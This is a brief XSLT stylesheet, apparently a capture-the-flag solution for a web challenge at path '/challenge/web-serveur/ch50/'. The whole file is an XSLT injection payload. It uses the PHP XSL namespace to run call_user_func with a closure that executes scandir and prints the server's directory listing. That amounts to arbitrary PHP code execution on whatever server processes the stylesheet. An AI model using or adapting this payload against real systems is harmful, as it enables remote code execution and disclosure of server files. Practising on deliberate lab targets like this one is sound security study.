<xsl:stylesheet version="1.0" 
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:php="http://php.net/xsl">
	
	<xsl:output method="html"/>
	<xsl:template match="/">
		
		<xsl:value-of select="php:function('call_user_func',
			function(){
				return print_r(scandir('/challenge/web-serveur/ch50/'), true);
			})
		" />
	</xsl:template>
</xsl:stylesheet>
